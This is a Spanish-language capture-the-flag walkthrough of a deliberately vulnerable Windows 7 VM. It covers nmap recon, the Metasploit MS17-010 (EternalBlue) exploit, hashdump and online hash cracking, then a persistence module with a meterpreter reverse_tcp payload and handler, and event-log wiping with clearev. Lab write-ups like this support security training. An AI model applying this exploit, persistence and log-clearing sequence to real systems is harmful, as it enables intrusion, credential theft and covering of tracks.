# Maquina Eternal

Dificultad --> Facil

Enlace de la maquina --> https://github.com/Rondon-Jesus92/Maquinas-Virtuales-CTF/blob/main/Descarga-de-Maquinas/eternal-VMware.zip

Instrucciones --> Se necesita instalar VMawre Workstation para poder virtualizar la maquina

'

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

'

## 1.Reconocmiento

Utilizamos el comando **--> sudo arp-scan -l <--** para encontrar la dirección IP de la Maquina 💻 victima

[![reconocimiento.jpg](https://i.postimg.cc/RVGV6vBt/reconocimiento.jpg)](https://postimg.cc/1fnZbh4R)

Escaneando puertos y sus versiones utilizando el comando **nmap** con diferentes parámetros a la IP que conseguimos 🔎

[![reconocimiento2.jpg](https://i.postimg.cc/1RK41Gfs/reconocimiento2.jpg)](https://postimg.cc/ThpTrWV4)



[![reconocimiento3.jpg](https://i.postimg.cc/X77qjrCF/reconocimiento3.jpg)](https://postimg.cc/8s9NwPwP)


Convertimos el archivo que se nos genero para visualizarlo mejor con el siguiente comando **--> xsltproc blue-nmap-results.xml -o blue-nmap-results.html <--** y luego lo abrimos con el navegador


[![reconocimiento4.jpg](https://i.postimg.cc/rFnmKq1H/reconocimiento4.jpg)](https://postimg.cc/Xp53PSDK)


[![reconocimiento5.jpg](https://i.postimg.cc/G2x3rR3q/reconocimiento5.jpg)](https://postimg.cc/qhgHX933)


### Resumen de la Información Obtenida

|IP             | Sistema OPerativo | Puertos/Servicios                | 
|:------------: |:-----------------:| :-------------------------------:| 
| 192.168.1.17  | Windows 7 ultime  | 135/tcp msrpc                    |
|               |                   | 139/tcp netbios-ssn              |
|               |                   | 445/tcp microsoft-ds             |
|               |                   | 49152-49157/tcp microsoft-rpc    |



## 2. Análisis de Vulnerabilidades / Debilidades

Buscamos un exploit con el comando **--> searchsploit ms17-010 <--** la vulnerabilidad que conseguimos

[![analisis.jpg](https://i.postimg.cc/tTqQ3xyN/analisis.jpg)](https://postimg.cc/McFFxXnn)

## 3. Explotación

Abrimos metasploit con el comando **--> msfconsole <--**, luegos buscamos el exploit MS17-010 con el comando **--> search MS17-010 <--**
Se nos desplegara varias opciones la cual vamos a seleccionar es la N° 0 con el comando **--> use 0 <--**

[![explotacion.jpg](https://i.postimg.cc/qR1fjvvV/explotacion.jpg)](https://postimg.cc/N92P0YXp)

Cambiamos el parametro RHOSTS por la IP de la maquina victima 💻, para luego proceder a ejecutar el exploit 💣


[![explotacion2.jpg](https://i.postimg.cc/ZKBkxZk2/explotacion2.jpg)](https://postimg.cc/xc2F9w13)


Ejecutamos el siguiente comando **--> hashdump <--**

[![explotacion3.jpg](https://i.postimg.cc/sXdCvNHq/explotacion3.jpg)](https://postimg.cc/670mPYXf)

Conseguimos unas credenciales encriptadas las cuales la podemos decifrar en diferentes paginas online como por ejemplo **crackstation**

[![explotacion4.jpg](https://i.postimg.cc/DykV6H2z/explotacion4.jpg)](https://postimg.cc/xqRFTsNr)

Ya tenemos la contraseña del usuario **Hacker Mentor User** y del usuario **Hacker Mentor Admin**, podemos acceder a cada uno de los usuario y en el escritorio vamos a conseguir la **Bandera1** y la **Bandera2**

### Accediendo al usuario Hacker Mentor User


[![bandera1.jpg](https://i.postimg.cc/W36Ctbkq/bandera1.jpg)](https://postimg.cc/vgT3NyXG)


### Accediendo al usuario Hacker Mentor Admin


[![bandera2.jpg](https://i.postimg.cc/wMwrcfF6/bandera2.jpg)](https://postimg.cc/30D93ZP6)



## 4.Banderas 🏁

|Bandera 1 | 0ef3b7d488b11e3e800f547a0765da8e |
|:--------:|:--------------------------------:|
|Bandera 2 | A63c1c39c0c7fd570053343451667939 |


## 5.Extra 🚨

Vamos a proceder a realizar persistencia en esta maquina 💻, ejecutamos el comando **--> getpid <--** y luego **--> ps <--** para ver los procesos que se estan ejecutando

[![persistencia.jpg](https://i.postimg.cc/28R6W0MQ/persistencia.jpg)](https://postimg.cc/vDhbFtQT)


Luego vamos hacer una migración de proceso al 2872 del admin

[![persistencia2.jpg](https://i.postimg.cc/j2Vszjgx/persistencia2.jpg)](https://postimg.cc/2bwRYCNM)

Realizamos un Backgrounding y cambiamos el exploit por el exploit/windows/local/persistence

[![persistencia3.jpg](https://i.postimg.cc/Twn8vJ0x/persistencia3.jpg)](https://postimg.cc/1nR7p6b7)


Seleccionamos el payload windows/x64/meterpreter/reverse_tcp

[![persistencia4.jpg](https://i.postimg.cc/qMkPWn3f/persistencia4.jpg)](https://postimg.cc/V5VZCJg4)

Modificamos el DELAY y la SESSION

[![persistencia5.jpg](https://i.postimg.cc/2y34B2tR/persistencia5.jpg)](https://postimg.cc/9w546tVJ)

Procedemos a Realizar un run

[![persistencia6.jpg](https://i.postimg.cc/vBK4CM0k/persistencia6.jpg)](https://postimg.cc/47z49CkQ)

luego usaremos los siguientes comandos:

**--> use exploir/multi/handler**

**--> set payload windows/x64/meterpreter/reverse_tcp**

[![persistencia7.jpg](https://i.postimg.cc/YS59x8jB/persistencia7.jpg)](https://postimg.cc/DWcnvrqx)

Ahora vamos a proceder a modificar el LHOST por la IP de nuestra maquina 🖥️

[![persistencia8.jpg](https://i.postimg.cc/PrJjPYrW/persistencia8.jpg)](https://postimg.cc/HjqKNJMn)

Verificamos que todos los parametros esten correctos y procedemos hacer run 

[![persistencia9.jpg](https://i.postimg.cc/nMbGbq3y/persistencia9.jpg)](https://postimg.cc/5QgC8Qdg)

A pesar de que la maquina la han reiniciado aun tenemos acceso 🥷, ahora por ultimo vamos a proceder a realizar un borrado de huella 🤫👣 con el comando **--> clearev <--**


[![borradohuella.jpg](https://i.postimg.cc/x8YL69qQ/borradohuella.jpg)](https://postimg.cc/8JKF5QhX)
